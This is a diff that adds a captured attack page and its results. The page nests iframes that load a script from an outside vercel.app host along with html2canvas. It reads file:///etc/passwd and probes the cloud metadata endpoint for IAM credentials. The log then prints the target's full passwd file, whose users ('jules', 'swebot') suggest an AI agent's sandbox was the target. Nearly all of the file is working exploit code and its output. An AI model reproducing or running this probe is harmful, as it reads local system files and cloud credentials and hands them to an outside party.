@@ -1,0 +1,46 @@
+--- MAIN PAGE HTML ---
+<!DOCTYPE html><html><head>
+  <title>Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc="<script src=&quot;https://donreddy.vercel.app&quot;></script><iframe src=&quot;file:///etc/passwd&quot; width=&quot;20%&quot; height=&quot;30%&quot;></iframe><iframe src=&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot; title=&quot;SSRF Test&quot; width=&quot;20%&quot; height=&quot;30%&quot;></iframe>"></iframe>
+
+
+</body></html>
+
+--- OUTER IFRAME (SRCDOC) DOCUMENT HTML ---
+<html><head><script src="https://donreddy.vercel.app"></script><script type="text/javascript" async="" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"></script></head><body><iframe src="file:///etc/passwd" width="20%" height="30%"></iframe><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF Test" width="20%" height="30%"></iframe></body></html>
+
+--- INNER IFRAME 1 (file:///etc/passwd) DOCUMENT HTML ---
+<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+dnsmasq:x:991:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
+jules:x:1001:1001::/home/swebot:/bin/bash
+swebot:x:1001:0::/home/jules:/bin/bash
+</pre></body></html>
+
+--- INNER IFRAME 2 (metadata) DOCUMENT HTML ---
+<html><head></head><body></body></html>
